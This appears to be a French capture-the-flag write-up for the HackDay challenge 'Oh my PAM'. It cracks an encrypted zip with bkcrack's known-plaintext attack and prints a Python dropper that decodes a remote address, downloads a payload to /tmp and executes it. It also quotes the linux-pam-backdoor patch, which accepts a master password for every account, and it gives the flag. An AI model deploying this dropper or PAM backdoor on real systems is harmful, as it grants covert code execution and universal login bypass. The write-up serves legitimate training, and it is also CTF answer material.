# Oh my PAM

Nous avions un outil, mais le zip a un mot de passe. Même si nous pourrions bruteforcer le mot de passe, il existe un outil plus intéressant, [bkcrack](https://github.com/kimci86/bkcrack), créé par kimci86. Cet outil permet de faire des attaques par clair connu sur les fichiers zip contenant des archives chiffrées au format ZipCrypto.

En regardant le nom des fichiers contenus dans le zip, nous pouvons voir qu'il y a un fichier DS.jpeg. N'avons-nous donc pas déjà vu une image de DS dans l'épreuve [Baby Web](babyweb.html) ? Allons chercher l'image !

Nous avons le fichier [DS_200x200.jpeg](http://challenges.hackday.fr:50399/static/DS_200x200.jpeg), mais la version originale est stockée juste à côté [DS.jpeg](http://challenges.hackday.fr:50399/static/DS.jpeg). Nous pouvons à présent attaquer le zip !

La commande `bkcrack -C SuperUltraTech30001.zip -c DS.jpeg -p DS.jpeg` ne fonctionne pas. En effet, en zippant l'image, elle a été compressée. DS.jpeg n'est donc pas le clair de ce qui a été chiffré. Pas de panique, il suffit de zipper sans mot de passe et on peut reprendre notre attaque 
```
$ zip Plain.zip DS.jpeg #Pour avoir le clair dans le zip
$ bkcrack -C SuperUltraTech30001.zip -c DS.jpeg -P plain.zip -p DS.jpeg
bkcrack 1.5.0 - 2022-07-07
[12:10:56] Z reduction using 52590 bytes of known plaintext
83.5 % (43930 / 52590) 
[12:10:59] Attack on 114 Z values at index 9121
Keys: 3ea43676 82bd21a5 3f21d103
100.0 % (114 / 114)
[12:10:59] Keys
3ea43676 82bd21a5 3f21d103
```

Muni des clés, nous pouvons dézipper l'archive:
```
bkcrack -C SuperUltraTech30001.zip -k 3ea43676 82bd21a5 3f21d103 -U unlocked.zip newpassword
unzip unlocked.zip # le nouveau mdp est newpassword
```
Nous trouvons un fichier python. Ce fichier vérifie de manière assez simpliste s'il tourne dans une vm avant de se supprimer. S'il ne détecte pas qu'il est dans une vm, il télécharge un autre fichier qu'il exéctue avant de se supprimer:

```
def load_p2():
        key = (os.name + getuser() + sys.argv[1]).encode() # Zip file password Super5MDP7768
        address = [47,7,7,29,8,72,64,64,65,98,91,66,84,66,27,124,116,102,25,6,3,12,95,28,7,8,12,27,12,64,7,38,5,21,23,31,84,33,51,49,69,82,24,93,8,10]
        addr = xor(key, address)
        if addr[1:5] == "http":
                r = requests.get(addr[1:]) # Add password or some shit to download it bruh
                with open("/tmp/.a", "wb") as f:
                        f.write(r.content)
                subprocess.Popen(["/tmp/.a", detach=True])
```
Nous utilisons le résultat de la concaténation du résultat de deux fonctions, et du mot de passe du zip, pour xorer la vraie addresse de la charge utile. Assez rapidement, on comprends que os. name = "posix" et que getuser() = "root". Il nous manque le mot de passe du zip, qu'on peut récupérer plus facilement qu'avec une attaque par force brute en retournant sur l'outil bkcrack:
```
bkcrack -k 3ea43676 82bd21a5 3f21d103 -r 13 ?a
bkcrack 1.5.0 - 2022-07-07
[12:25:31] Recovering password
length 0-6...
length 7...
length 8...
length 9...
length 10...
length 11...     
length 12...
length 13...         
47.0 % (1808 / 3844) 
[12:30:17] Password
as bytes: 53 75 70 65 72 35 4d 44 50 37 37 36 38 
as text: Super5MDP7768
```
Nous pouvons alors retrouver l'adresse: http://51.210.106.154/static/r, qui n'était pas sur l'infra du hackday pour éviter qu'on ne retrouve l'adresse trop facilement.

Ce lien contient un fichier script bash camouflé en exécutable. A première vue, en regardant avec un éditeur de texte avec gui, rien de transcendant. Cependant, une seconde examination avec nano nous donne instantanément un gros blob de base64. On dirait que le hackeur était sur le point de se faire hacker.

Enn déchiffrant le base64, on se rend compte que c'est un simple script qui va remplacer le script bash par une version non backdoorée avant d'essayer de remplacer le fichier pam_unix.so, qui est une librairie servant à authentifier les utilisateurs sous unix. Mais comment marche cette backdoor ?

Après quelques recherches, on trouve l'outil [linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor) fait par zephrax. Le programme va simplement recompiler la libpam après lui avoir appliqué un patch:

```
if (strcmp(p, "_PASSWORD_") != 0) {
!           retval = _unix_verify_password(pamh, name, p, ctrl);
!         } else {
!           retval = PAM_SUCCESS;
!         
```

En somme, nous avons un mot de passe maitre qui est valide, peu importe le compte ou le niveau de privilèges. C'est valable pour le ssh, pour la commande su, pour la commande sudo... En bref, c'est une backdoor formidable et discrète.

Nous allons donc reverser cette libpam en la comparant avec une libpam classique sur [binary ninja](https://cloud.binary.ninja). L'effet du patch est visible dans la fonction *pam_sm_authenticate*, où nous avons un appel à la fonction 
```
**strcmp(mdp_buf_1, ".gnu.version_r")**
```
Ce choix de ce mot de passe à été fait pour éviter d'avoir le mot de passe qui apparaît trop lorsqu'on utilise la commande strings dessus.

Nous avons donc notre flag: 
```
HACKDAY{.gnu.version_r}
```
P.S. Pour tout ceux qui ont été assez rapide, la première journée, mon vps était backdorée avec le même mot de passe, ce qui m'a valu un bon coup de flippe XD

